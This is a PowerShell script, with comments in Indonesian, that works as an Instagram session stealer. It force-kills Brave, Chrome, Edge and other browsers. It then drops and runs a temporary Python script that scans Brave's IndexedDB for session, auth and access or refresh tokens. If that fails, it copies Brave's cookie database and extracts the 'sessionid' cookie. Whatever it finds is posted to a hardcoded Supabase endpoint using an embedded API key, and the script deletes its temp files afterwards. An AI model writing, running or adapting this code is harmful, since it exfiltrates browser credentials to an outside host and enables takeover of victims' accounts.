# --- KONFIGURASI SUPABASE LOCAL ---
$SUPABASE_URL = "https://bsunzewnefxyamapczzw.supabase.co"
$SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzdW56ZXduZWZ4eWFtYXBjenp3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgxNjQ3MjQsImV4cCI6MjEwMzc0MDcyNH0.QzoTFIGOREcUXl6SfxvpxA61d53g0hTB9x8Dsbfthws"

# --- FUNGSI BANTUAN ---

function Kill-BrowserProcesses {
    Write-Host "[*] Menghentikan seluruh proses browser dan service terkait..."
    
    $processNames = @(
        "brave", "chrome", "msedge", "opera", "vivaldi",
        "BraveUpdate", "GoogleUpdate", "edgeupdate",
        "crashpad_handler", "chrome_crashpad_handler"
    )

    foreach ($proc in $processNames) {
        Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        
        Get-CimInstance Win32_Process -Filter "Name LIKE '%$proc%'" -ErrorAction SilentlyContinue | 
            Invoke-CimMethod -MethodName Terminate -ErrorAction SilentlyContinue | Out-Null
    }

    Start-Sleep -Seconds 3
}

function Save-To-Supabase {
    param ([string]$sessionId)
    try {
        Write-Host "[*] Menghubungkan ke Supabase Local..."
        
        $headers = @{
            "apikey"        = $SUPABASE_KEY
            "Authorization" = "Bearer $SUPABASE_KEY"
            "Content-Type"  = "application/json"
            "Prefer"        = "return=minimal"
        }
        
        $body = @{
            "session" = $sessionId
        } | ConvertTo-Json

        $response = Invoke-RestMethod -Uri $SUPABASE_URL -Method Post -Headers $headers -Body $body
        Write-Host "[✓] Berhasil menyimpan Session ID ke Supabase Local!"
        return $true
    }
    catch {
        Write-Host "[!] Gagal menyimpan ke Supabase: $_"
        return $false
    }
}

function Get-IndexedDBData {
    Write-Host "[*] Memulai pembacaan IndexedDB..."
    
    $indexDbPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\IndexedDB"
    
    if (-not (Test-Path $indexDbPath)) {
        Write-Host "[!] Folder IndexedDB tidak ditemukan di: $indexDbPath"
        return $null
    }

    # Buat script Python sementara untuk membaca SQLite
    $pythonScript = @"
import sqlite3
import os
import base64
import sys

def read_indexed_db(db_path):
    sessions_found = []
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        
        # Cek tabel yang ada
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
        tables = [t[0] for t in cursor.fetchall()]
        
        # IndexedDB biasanya menggunakan tabel 'items'
        if 'items' not in tables:
            return []

        # Ambil semua data dari tabel items
        # Kita ambil semua karena kita tidak tahu strukturnya
        cursor.execute("SELECT key, value FROM items;")
        rows = cursor.fetchall()
        
        for row in rows:
            key, value = row
            
            # Proses value jika bytes
            if isinstance(value, bytes):
                try:
                    # Coba decode UTF-8 dulu
                    decoded_val = value.decode('utf-8')
                    # Cek jika ini JSON atau string biasa
                    if '{' in decoded_val or '[' in decoded_val:
                        try:
                            import json
                            json_obj = json.loads(decoded_val)
                            # Jika JSON, kita simpan sebagai string JSON
                            value_str = json.dumps(json_obj)
                        except:
                            value_str = decoded_val
                    else:
                        value_str = decoded_val
                except UnicodeDecodeError:
                    # Jika gagal decode, coba base64
                    value_str = base64.b64encode(value).decode('utf-8')
            else:
                value_str = str(value)

            # Cari keyword yang relevan
            key_lower = key.lower()
            if any(kw in key_lower for kw in ['session', 'sid', 'token', 'auth', 'access_token', 'refresh_token']):
                sessions_found.append({
                    'key': key,
                    'value': value_str
                })
                
        conn.close()
    except Exception as e:
        pass # Abaikan error per file
        
    return sessions_found

# Scan semua file .db di folder IndexedDB
index_db_path = r"$indexDbPath"
all_sessions = []

for root, dirs, files in os.walk(index_db_path):
    for file in files:
        if file.endswith(".db"):
            db_path = os.path.join(root, file)
            found = read_indexed_db(db_path)
            if found:
                all_sessions.extend(found)

# Output ke stdout dalam format yang mudah diparsing oleh PowerShell
for session in all_sessions:
    print(f"SESSION_FOUND:{session['key']}:---{session['value']}")
"@

    $pythonScriptPath = "$env:TEMP\read_indexeddb.py"
    $pythonScript | Out-File -FilePath $pythonScriptPath -Encoding utf8

    try {
        $output = python "$pythonScriptPath" 2>&1
        
        $sessionId = $null
        
        foreach ($line in $output) {
            if ($line -match "^SESSION_FOUND:(.+?):---(.+)$") {
                $key = $Matches[1]
                $value = $Matches[2]
                
                Write-Host "[+] Ditemukan Key: $key"
                
                # Prioritas: Cari 'sessionid', 'sid', atau 'access_token'
                if ($value -match "(?i)sessionid" -or $key -match "(?i)sessionid") {
                    # Ekstrak nilai sessionid yang bersih
                    $cleanSession = $value -replace '[^\w%:-]', ''
                    if ($cleanSession.Length -gt 10) { # Minimal panjang sessionid
                        $sessionId = $cleanSession
                        Write-Host "[✓] Session ID ditemukan: $sessionId"
                        break
                    }
                }
                
                # Jika tidak ditemukan sessionid spesifik, coba ambil token akses
                if (-not $sessionId -and ($key -match "(?i)access_token" -or $key -match "(?i)refresh_token")) {
                    $sessionId = $value -replace '[\s"]', ''
                    Write-Host "[✓] Token ditemukan: $sessionId"
                    break
                }
            }
        }

        return $sessionId
    }
    catch {
        Write-Host "[!] Gagal menjalankan Python reader: $_"
        return $null
    }
    finally {
        # Bersihkan file python sementara
        if (Test-Path $pythonScriptPath) {
            Remove-Item $pythonScriptPath -Force
        }
    }
}

# --- ALUR UTAMA ---

function Get-InstagramSession {
    # 1. Matikan browser agar file tidak terkunci
    Kill-BrowserProcesses

    # 2. Coba ambil dari IndexedDB (untuk data terbaru, token, dll)
    $sessionId = Get-IndexedDBData
    
    if (-not $sessionId) {
        Write-Host "[!] Session ID tidak ditemukan di IndexedDB. Mencoba fallback ke Cookie DB..."
        
        # 3. Fallback ke Cookie DB (kode lama kamu)
        $possiblePaths = @(
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies",
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Network\Cookies",
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Cookies"
        )

        $dbPath = $null
        foreach ($path in $possiblePaths) {
            if (Test-Path $path) {
                $dbPath = $path
                break
            }
        }

        if (-not $dbPath) {
            Write-Host "[!] File database cookie Brave tidak ditemukan."
            return
        }

        $tempDb = "$env:TEMP\brave_cookies_temp.db"

        # Salin file menggunakan FileStream dengan FileShare.ReadWrite
        try {
            $sourceStream = New-Object System.IO.FileStream($dbPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
            $destStream = New-Object System.IO.FileStream($tempDb, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
            
            $sourceStream.CopyTo($destStream)
            
            $destStream.Close()
            $sourceStream.Close()
        }
        catch {
            Write-Host "[!] Gagal menyalin file database: $_"
            return
        }

        Write-Host "[*] Membaca database cookie Brave..."

        try {
            $bytes = [System.IO.File]::ReadAllBytes($tempDb)
            $text = [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($bytes)

            if ($text -match 'sessionid\x00([^\x00\r\n\t]+)') {
                $rawSession = $Matches[1]
                $sessionId = $rawSession -replace '[^\w%:-]', ''
                Write-Host "[✓] Session ID dari Cookies ditemukan: $sessionId"
            }
            else {
                Write-Host "[!] Session ID tidak ditemukan di Cookies juga."
            }
        }
        catch {
            Write-Host "[!] Gagal membaca bytes cookie: $_"
        }
        finally {
            # Hapus temp db
            if (Test-Path $tempDb) { Remove-Item $tempDb -Force }
        }
    }

    # 4. Simpan ke Supabase jika ditemukan
    if ($sessionId) {
        Save-To-Supabase -sessionId $sessionId
    }
    else {
        Write-Host "[!] Gagal mendapatkan Session ID dari mana pun."
    }
}

# Jalankan fungsi utama
Get-InstagramSession